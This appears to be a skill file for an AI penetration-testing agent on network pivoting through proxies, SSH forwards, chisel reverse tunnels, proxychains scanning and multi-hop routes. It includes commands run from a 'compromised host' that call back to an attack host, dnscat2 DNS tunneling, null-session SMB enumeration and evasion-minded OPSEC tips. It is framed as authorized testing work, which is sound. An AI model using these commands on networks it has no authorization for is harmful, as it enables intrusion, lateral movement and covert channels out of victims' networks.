---
name: network_pivoting
description: Verify network routes through supplied proxies or authorized tunnels; distinguish proxy reachability from remote shell access
---

# Network Pivoting (Lateral Movement)

**When to use this skill:** An in-scope service requires a proxy or tunnel, or
an existing route needs verification. Supplied SOCKS5 access may be necessary
even for the initial target. Follow `internal/methodology` when deciding whether
to create a new route; a verified remote shell may allow on-host work without
one. Network reachability alone does not provide shell access.

## GSocket: Direct Access vs SOCKS5 Proxy

The GSocket key identifies a connection, not its remote service. Confirm the
operator-provided peer mode before choosing client options. Interactive shell
mode uses an interactive peer; local port forwarding requires the corresponding
remote service, and only a SOCKS-mode peer can provide SOCKS through that port.
Adding `-p` to a shell connection does not create a SOCKS server.

`exec_command` begins in the sandbox. Record a remote session's verified hostname,
user and privileges before running host-specific commands through that session.
Use `record_internal_event` with `host_capability` for verified session facts and
`pivot_verified` only after a successful route check. If access fails, report it;
do not fall back to on-host commands without another verified shell.

Reference: [gs-netcat manual](https://www.thc.org/gs-netcat.1.html).

**Order of operations:**
1. Identify declared access and verify the needed capability.
2. Reuse the supplied route or verified shell for the current in-scope objective.
3. Establish a new route only when required, permitted and technically viable.

## Configure Proxychains (for SOCKS5 routing)

Choose a unique per-assignment filename (replace `assignment` below) and use
that same file explicitly with `-f` on every proxychains invocation. Populate
the supplied or verified proxy endpoint; do not assume port 1088.

```bash
# Use a per-assignment config; preserve any operator-provided configuration.
cat > /workspace/proxychains-assignment.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1088
EOF

# Verify
proxychains4 -f /workspace/proxychains-assignment.conf nc -zv <IN_SCOPE_IP> <PORT>
```

### Via SSH Dynamic Port Forward

```bash
# If SSH access to the foothold host
ssh -D 1080 -N -f user@<foothold_ip>

# Or through existing proxy chain
proxychains4 -f /workspace/proxychains-assignment.conf ssh -D 1080 -N -f user@<foothold>

# Update proxychains.conf
socks5 127.0.0.1 1080
```

### Via Chisel

```bash
# On attack host (server):
chisel server -p 8080 --reverse

# On compromised host (client):
chisel client <attack_ip>:8080 R:socks

# Now SOCKS5 is available on 127.0.0.1:1080 on the attack host
# Update proxychains.conf:
socks5 127.0.0.1 1080
```

## Using the Proxy

```bash
# All tools through the proxy
proxychains4 -f /workspace/proxychains-assignment.conf nmap -sT -Pn -n -p 80,443,22,445,3306,3389 10.0.0.0/24
proxychains4 -f /workspace/proxychains-assignment.conf nxc smb 10.0.0.0/24 -u '' -p '' --gen-relay-list
proxychains4 -f /workspace/proxychains-assignment.conf curl http://10.0.0.100:8080/
proxychains4 -f /workspace/proxychains-assignment.conf ssh user@10.0.0.50

# fscan: select its explicit SOCKS option; HTTP proxy variables do not prove
# that every scanner protocol will be routed through the proxy.
fscan -h <IN_SCOPE_CIDR> -socks5 127.0.0.1:1088
```

## Internal Network Scanning

```bash
# Through SOCKS5 proxy
proxychains4 -f /workspace/proxychains-assignment.conf nmap -sT -Pn -n -p 22,80,443,445,1433,3306,3389,5985,5986,6379,27017 10.0.0.0/24 --open

# fscan (comprehensive, has proxy support)
fscan -h 10.0.0.0/24 -socks5 127.0.0.1:1088

# Quick port check
proxychains4 -f /workspace/proxychains-assignment.conf nc -zv <ip> <port>

# Full nmap through proxy (slower but thorough)
proxychains4 -f /workspace/proxychains-assignment.conf nmap -sT -Pn -n -sV --version-intensity 5 -p 1-1000 <target_ip>
```

## Port Forwarding

### SSH Local Port Forward

```bash
# Forward local port to internal service
ssh -L 8443:10.0.0.100:443 user@<foothold>
# Now access https://localhost:8443 → internal 10.0.0.100:443

# Forward RDP
ssh -L 3389:10.0.0.50:3389 user@<foothold>
xfreerdp /v:localhost /u:user /p:pass
```

### SSH Remote Port Forward

```bash
# Make internal service accessible on attack host
ssh -R 8080:10.0.0.100:80 user@<attack_ip>
```

### Chisel Port Forward

```bash
# Remote port forward via chisel
# On attack host:
chisel server -p 8080 --reverse

# On compromised host:
chisel client <attack_ip>:8080 R:3389:10.0.0.50:3389

# Now localhost:3389 on attack host → 10.0.0.50:3389
```

## Proxychains Configuration Reference

```bash
# /etc/proxychains4.conf
strict_chain          # Each proxy in chain must succeed
# quiet_mode          # Suppress output (optional)
proxy_dns             # Route DNS through proxy
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1088  # GSocket (port 1088 for auto-proxy)
# socks5 127.0.0.1 1080  # SSH/chisel default
```

## Multi-Hop Pivoting

```bash
# Hop 1: A → B
ssh -D 1080 user@hostB

# Hop 2: B → C (through hop 1)
proxychains4 -f /workspace/proxychains-assignment.conf ssh -D 1081 user@hostC

# Update proxychains for chain:
socks5 127.0.0.1 1081

# All traffic now goes A → B → C → target
```

## DNS Tunneling (Last Resort)

When only DNS egress is available:

```bash
# dnscat2 (on attack host)
ruby dnscat2.rb yourdomain.com

# On compromised host
dnscat2-v0.07-client-win-x64.exe --domain yourdomain.com --dns server 8.8.8.8
```

## OPSEC Notes

- Proxychains generates connection logs on the foothold host
- Nmap through proxy is slower and may miss UDP services
- fscan is faster but noisier
- Prefer specific port checks over broad scans
- DNS tunneling is detectable by DNS monitoring
- Stop only proxy processes created by this assignment after checking shared dependencies. Remove our per-assignment config or restore precisely the entries we changed; never delete an existing global proxy configuration. Record verified cleanup with the original resource ID.
